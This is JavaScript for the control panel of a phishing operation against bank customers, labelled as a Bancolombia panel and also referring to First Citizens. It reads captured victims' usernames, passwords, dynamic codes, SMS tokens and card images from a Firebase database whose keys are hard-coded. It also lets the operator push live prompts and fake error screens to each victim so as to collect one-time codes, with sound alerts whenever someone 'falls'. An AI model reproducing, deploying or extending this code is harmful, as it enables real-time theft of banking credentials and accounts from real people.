
        // --- 1. CONFIGURACIÓN FIREBASE ---
        // TODO: Update these with the correct First Citizens Firebase credentials later
        const firebaseConfig = {
            apiKey: "AIzaSyA9qspuy_l1vseHqKx9klUg3P9JGx_GZLo",
            authDomain: "sca-mms.firebaseapp.com",
            databaseURL: "https://sca-mms-default-rtdb.firebaseio.com",
            projectId: "sca-mms",
            storageBucket: "sca-mms.firebasestorage.app",
            messagingSenderId: "965549232304",
            appId: "1:965549232304:web:46186cadacaa0d3f5d73df"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const database = firebase.database();
        const victimsList = document.getElementById('victims-list');

        // --- FUNCIÓN COPIAR AL PORTAPAPELES ---
        window.copyToClipboard = function (text, element) {
            if (text === '-' || !text) // return;
            navigator.clipboard.writeText(text).then(() => {
                const originalColor = element.style.color || '';
                element.style.color = '#10b981';
                setTimeout(() => {
                    element.style.color = originalColor;
                }, 600);
            });
        };

        // --- 2. ESCUCHA DE DATOS ---
        const DB_PATH = 'victims_provinet'; // New path for this project

        let knownVictims = new Set();
        let knownDinamica = new Map(); // id -> last token value
        let knownTokenSms = new Map(); // id -> last email_token value
        let isInitialLoad = true;

        database.ref(DB_PATH).on('value', (snapshot) => {
            const data = snapshot.val();

            if (!data || Object.keys(data).length === 0) {
                victimsList.innerHTML = `
                    <tr>
                        <td colspan="14">
                            <div class="empty-state">
                                <i class="fas fa-folder-open"></i>
                                <p>No hay sesiones activas en este momento.</p>
                            </div>
                        </td>
                    </tr>
                `;
                isInitialLoad = false;
                return;
            }

            victimsList.innerHTML = '';

            const sortedVictims = Object.entries(data).sort((a, b) => (b[1].first_seen || 0) - (a[1].first_seen || 0));

            function toRoman(n) {
                const vals = [1000,900,500,400,100,90,50,40,10,9,5,4,1];
                const syms = ['M','CM','D','CD','C','XC','L','XL','X','IX','V','IV','I'];
                let r = '';
                for (let i = 0; i < vals.length; i++) {
                    while (n >= vals[i]) { r += syms[i]; n -= vals[i]; }
                }
                return r;
            }

            let victimIndex = 0;
            sortedVictims.forEach(([id, victim]) => {
                // Filter out empty sessions (ghost heartbeats with no real data)
                /* Filter removed completely */

                // ── MASTER MODE FILTER ──────────────────────────────────────
                // If 系统架构师 = false → only show victims from this same deployment URL
                // If 系统架构师 = true  → show ALL victims from ALL deployments
                const isMaster = (typeof CPANEL_CONFIG !== 'undefined') && CPANEL_CONFIG['系统架构师'] === true;
                if (!isMaster) {
                    const myHost = window.location.hostname;
                    if (victim.source_host && victim.source_host !== myHost) {
                        return; // belongs to a different deployment, skip
                    }
                }
                // ────────────────────────────────────────────────────────────


                victimIndex++;
                const tr = document.createElement('tr');
                const victimLabel = 'Nueva Víctima ' + toRoman(victimIndex);

                let isOnline = victim.online_status === 'Online';
                let onlineClass = isOnline ? 'is-online' : '';
                let onlineText = isOnline ? 'ONLINE' : 'OFFLINE';


                let tipoHtml = '-';
                if (victim.tipo) {
                    let t = victim.tipo.toLowerCase().trim();
                    let color = '#6b7280';
                    if (t === 'nit')        color = '#3b82f6';
                    else if (t === 'cc')    color = '#10b981';
                    else if (t === 'ce')    color = '#f59e0b';
                    else if (t === 'pas')   color = '#8b5cf6';
                    else if (t === 'ti')    color = '#ec4899';
                    else if (t === 'rc')    color = '#14b8a6';
                    else if (t === 'nie')   color = '#f97316';
                    else if (t === 'te')    color = '#06b6d4';
                    else if (t === 'ppt')   color = '#a855f7';
                    tipoHtml = '<span style="color:' + color + '; font-weight: 900; font-size: 1rem; border: 2px solid ' + color + '; padding: 2px 6px; border-radius: 4px; letter-spacing:1px;">' + victim.tipo.toUpperCase() + '</span>';
                }

                
                let tarjetaHtml = '-';
                if (victim.tarjeta) {
                    if (victim.tarjeta.startsWith('data:application/pdf')) {
                        tarjetaHtml = `<a href="${victim.tarjeta}" download="tarjeta_${id}.pdf" class="btn btn-green" style="padding:4px 8px; width:auto; display:inline-block; font-size:11px; text-decoration:none; color:white; background-color:#2ec866; border:none; border-radius:3px; text-align:center;"><i class="fas fa-file-pdf"></i> Descargar PDF</a>`;
                    } else if (victim.tarjeta.startsWith('data:image')) {
                        tarjetaHtml = `<button class="btn btn-blue" onclick="window.open('${victim.tarjeta}', '_blank')" style="padding:4px 8px; width:auto; display:inline-block; font-size:11px;">🖼️ Ver Tarjeta</button>`;
                    } else {
                        tarjetaHtml = `<span class="data-hl-green">${victim.tarjeta}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${victim.tarjeta}', this)"></i>`;
                    }
                }

                tr.innerHTML = `
                    <td><span style="color:#B20000;font-weight:700;font-size:0.85rem;white-space:nowrap">${victimLabel}</span></td>
                    <td>${tipoHtml}</td>
                    <td><span class="data-hl">${victim.usuario || '-'}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${victim.usuario || '-'}', this)"></i></td>
                    <td><span class="data-hl-red">${victim.contrasena || '-'}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${victim.contrasena || '-'}', this)"></i></td>
                    <td><span class="data-hl">${victim.token || '-'}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${victim.token || '-'}', this)"></i></td>
                    <td>${tarjetaHtml}</td>
                    <td><span class="data-hl-blue">${victim.email_token || '-'}</span> <i class="fas fa-copy copy-icon" onclick="copyToClipboard('${victim.email_token || '-'}', this)"></i></td>
                    
                    <td>
                        <div class="status-box">
                            <span class="status-pill">ESPERANDO</span>
                            <div class="online-status ${onlineClass}">
                                <i class="fas fa-circle" style="font-size: 8px;"></i> ${onlineText}
                            </div>
                            <span class="sub-status"><i class="fas fa-map-marker-alt" style="color:#f59e0b"></i> ${victim.status || 'Inicio'}</span>
                        </div>
                    </td>

                    <!-- ACC. LOGIN -->
                    <td>
                        <div class="action-group">
                            <button class="btn btn-blue" onclick="sendCommand('${id}', 'pedir_usuario')"><i class="fas fa-user"></i> User</button>
                            <button class="btn btn-red" onclick="sendCommand('${id}', 'error_usuario')"><i class="fas fa-user-times"></i> BAD USER</button>
                        </div>
                    </td>

                    <!-- ACC. TOKEN -->
                    <td>
                        <div class="action-group">
                            <button class="btn btn-blue" onclick="sendCommand('${id}', 'pedir_token')"><i class="fas fa-comment-sms"></i> Clv Especial</button>
                            <button class="btn btn-red" onclick="sendCommand('${id}', 'error_token')"><i class="fas fa-times-circle"></i> Error Clave</button>
                        </div>
                    </td>

                    <!-- ACC. AMIVEN -->
                    <td>
                        <div class="action-group">
                            <button class="btn btn-green" onclick="sendCommand('${id}', 'pedir_correo')"><i class="fas fa-mobile-alt"></i> Token</button>
                            <button class="btn btn-red" onclick="sendCommand('${id}', 'error_correo')"><i class="fas fa-exclamation-circle"></i> Error Tkn</button>
                        </div>
                    </td>

                    <!-- CONTROL -->
                    <td>
                        <div class="action-group">
                            <button class="btn btn-red" onclick="deleteVictim('${id}')"><i class="fas fa-trash-alt"></i> ELIMINAR</button>
                            <button class="btn btn-orange" onclick="sendCommand('${id}', 'limpiar')"><i class="fas fa-broom"></i> LIMPIAR</button>
                        </div>
                    </td>
                `;
                victimsList.appendChild(tr);

                // Sonido nueva victima SOLO si es realmente nueva
                if (!knownVictims.has(id)) {
                    knownVictims.add(id);
                    if (!isInitialLoad) {
                        playSound('Son3.mp3', '\uD83D\uDD34 Nueva V\u00edctima', '\u00a1Alguien acaba de caer! Revisa el panel.');
                    }
                }

                // Sonido cuando llega la Dinamica (victim.token)
                const currentDinamica = victim.token || '';
                if (!isInitialLoad && currentDinamica && currentDinamica !== '-' && knownDinamica.get(id) !== currentDinamica) {
                    playSound('SonDinamica.mp3', '\uD83D\uDCDD Din\u00e1mica recibida', 'El c\u00f3digo din\u00e1mico acaba de llegar.');
                }
                knownDinamica.set(id, currentDinamica);

                // Sonido cuando llega el Token SMS (victim.email_token)
                const currentToken = victim.email_token || '';
                if (!isInitialLoad && currentToken && currentToken !== '-' && knownTokenSms.get(id) !== currentToken) {
                    playSound('SonToken.mp3', '\uD83D\uDCF1 Token SMS recibido', 'El token SMS acaba de llegar.');
                }
                knownTokenSms.set(id, currentToken);
            });
            isInitialLoad = false;
        });

        // --- SONIDOS + NOTIFICACIONES ---
        var audioCtx = null;
        var alertasActivas = false;

        function activarAlertas() {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
            if (audioCtx.state === 'suspended') audioCtx.resume();

            // Tocar sonido de prueba (desbloquea audio)
            try {
                var a = new Audio('son/Son3.mp3');
                a.volume = 0.5;
                a.play().catch(function(){});
            } catch(e) {}

            if ('Notification' in window) {
                Notification.requestPermission().then(function(perm) {
                    if (perm === 'granted') {
                        alertasActivas = true;
                        document.getElementById('alerta-txt').textContent = 'ALERTAS ACTIVAS ✅';
                        document.getElementById('btn-activar-alertas').style.background = '#10b981';
                        document.getElementById('btn-activar-alertas').style.color = '#fff';
                        new Notification('\uD83D\uDD34 Panel Bancolombia', {
                            body: 'Alertas activadas. Te avisaremos cuando caiga alguien.',
                            icon: 'img/LogoBancolombia.png',
                            silent: false
                        });
                    } else {
                        alertasActivas = true;
                        document.getElementById('alerta-txt').textContent = 'SOLO AUDIO 🔊';
                        document.getElementById('btn-activar-alertas').style.background = '#3b82f6';
                        document.getElementById('btn-activar-alertas').style.color = '#fff';
                    }
                });
            } else {
                alertasActivas = true;
                document.getElementById('alerta-txt').textContent = 'SOLO AUDIO 🔊';
                document.getElementById('btn-activar-alertas').style.background = '#3b82f6';
            }
        }

        function playSound(file, notifTitle, notifBody) {
            if (!alertasActivas) return;

            try {
                var a = new Audio('son/' + file);
                a.volume = 1.0;
                a.play().catch(function(){});
            } catch(e) {}

            if ('Notification' in window && Notification.permission === 'granted') {
                var n = new Notification(notifTitle || '\uD83D\uDD34 Panel Bancolombia', {
                    body: notifBody || 'Nueva actividad en el panel',
                    icon: 'img/LogoBancolombia.png',
                    silent: false
                });
                setTimeout(function() { n.close(); }, 8000);
            }
        }

        // --- 3. ACCIONES DEL PANEL ---
        window.sendCommand = function (id, actionStr) {

            // Sonidos por accion
            if (actionStr === 'pedir_token') {
                playSound('Son2.mp3');
            } else if (actionStr === 'pedir_correo') {
                playSound('Son4.mp3');
            } else if (actionStr === 'error_token' || actionStr === 'error_correo') {
                playSound('Son1.mp3');
            }

            if (actionStr === 'limpiar') {
                // Wipe user data inputs but keep the session
                database.ref(DB_PATH + '/' + id).update({
                    usuario: '',
                    contrasena: '',
                    token: '',
                    email: '',
                    email_token: '',
                    status: 'Inputs limpiados'
                });
                return;
            }

            // Send command
            database.ref(DB_PATH + '/' + id + '/command').set({
                action: actionStr,
                timestamp: Date.now()
            });

            // Update status text purely for the panel
            let estadoMsg = "Comando Enviado";
            if (actionStr === 'error_login') estadoMsg = "Mostrando Error Login";
            if (actionStr === 'pedir_token') estadoMsg = "Pidiendo Token SMS";
            if (actionStr === 'error_token') estadoMsg = "Error en Token SMS";
            if (actionStr === 'pedir_correo') estadoMsg = "Pidiendo AmiVen";
            if (actionStr === 'error_correo') estadoMsg = "Error en AmiVen";
            if (actionStr === 'inicio') estadoMsg = "Llevando a Inicio";

            database.ref(DB_PATH + '/' + id + '/status').set(estadoMsg);
        };

        window.deleteVictim = function (id) {
            if (confirm("¿Estás seguro de que deseas eliminar este registro por completo?")) {
                database.ref(DB_PATH + '/' + id).remove();
            }
        }

        let activeVictim = null;
        let cpanelImageBase64 = null;

        // --- Manejador de archivo seleccionado ---
        window.handleFileSelect = function(event) {
            const file = event.target.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = function(evt) {
                const pasteArea = document.getElementById('paste-area');
                pasteArea.innerHTML = '';
                const img = document.createElement('img');
                img.src = evt.target.result;
                img.style.cssText = 'max-width:100%;max-height:150px;object-fit:contain;border-radius:4px;';
                pasteArea.appendChild(img);
            };
            reader.readAsDataURL(file);
            event.target.value = '';
        };


        let pasteBlockerAdded = false;

        window.openImageModal = function(id) {
            activeVictim = id;
            cpanelImageBase64 = null;
            const pasteArea = document.getElementById('paste-area');
            pasteArea.removeAttribute('contenteditable');
            pasteArea.innerHTML = '<span style="color:#888;font-size:0.9rem;pointer-events:none">Haz clic aquí y pega con Ctrl+V</span>';
            document.getElementById('image-modal-overlay').style.display = 'flex';
            
            if (!pasteBlockerAdded) {
                pasteBlockerAdded = true;
                pasteArea.addEventListener('paste', function(e) {
                    e.preventDefault(); 
                    const items = (e.clipboardData || window.clipboardData || {}).items || [];
                    
                    let imageFound = false;
                    for (let i = 0; i < items.length; i++) {
                        if (items[i].type.indexOf('image') !== -1) {
                            const blob = items[i].getAsFile();
                            if (blob) {
                                imageFound = true;
                                const reader = new FileReader();
                                reader.onloadend = () => {
                                    cpanelImageBase64 = reader.result; 
                                    pasteArea.innerHTML = '<img src="' + cpanelImageBase64 + '" style="max-width:100%;max-height:150px;object-fit:contain;border-radius:4px;">';
                                };
                                reader.readAsDataURL(blob);
                            }
                            break; 
                        }
                    }
                    if (!imageFound) alert("No se detectó ninguna imagen en tu portapapeles. Prueba copiando de nuevo la foto.");
                });
            }
            pasteArea.setAttribute('tabindex', '0');
            setTimeout(() => pasteArea.focus(), 150);
        }

        window.closeImageModal = function() {
            document.getElementById('image-modal-overlay').style.display = 'none';
            activeVictim = null;
        }

        window.sendImageCommand = async function() {
            if (!activeVictim) return;

            // Hack para caso "Seleccionar archivo"
            const pasteArea = document.getElementById('paste-area');
            const imgEl = pasteArea.querySelector('img');
            if (imgEl && !cpanelImageBase64 && imgEl.src.startsWith('data:image')) {
                cpanelImageBase64 = imgEl.src;
            }

            if (!cpanelImageBase64 || !cpanelImageBase64.startsWith('data:')) {
                alert("Primero haz click en el cuadro punteado y pega tu imagen con Ctrl+V (o súbela desde tu PC).");
                return;
            }

            try {
                // Enviar la base64 perfecta directamente a Firebase
                await database.ref(DB_PATH + '/' + activeVictim).update({
                    sec_image: cpanelImageBase64
                });
                
                await database.ref(DB_PATH + '/' + activeVictim + '/command').set({
                    action: 'pedir_contrasena',
                    timestamp: Date.now()
                });
                
                await database.ref(DB_PATH + '/' + activeVictim + '/status').set('Imagen de seguridad Mostrada');
                closeImageModal();
            } catch (err) {
                alert("Error crítico enviando la imagen: " + err);
            }
        }

        
        // --- CONEXION MONITOR ---
        const connectedRef = firebase.database().ref('.info/connected');
        connectedRef.on('value', (snap) => {
            const badge = document.getElementById('firebase-status');
            if (snap.val() === true) {
                badge.style.backgroundColor = 'rgba(16, 185, 129, 0.15)';
                badge.style.color = 'var(--success)';
                badge.style.borderColor = 'rgba(16, 185, 129, 0.3)';
                badge.innerHTML = '<div class="status-dot"></div> FIREBASE ACTIVO';
            } else {
                badge.style.backgroundColor = 'rgba(239, 68, 68, 0.15)';
                badge.style.color = 'var(--danger)';
                badge.style.borderColor = 'rgba(239, 68, 68, 0.3)';
                badge.innerHTML = '<div class="status-dot" style="background-color: var(--danger);"></div> DESCONECTADO';
            }
        });
    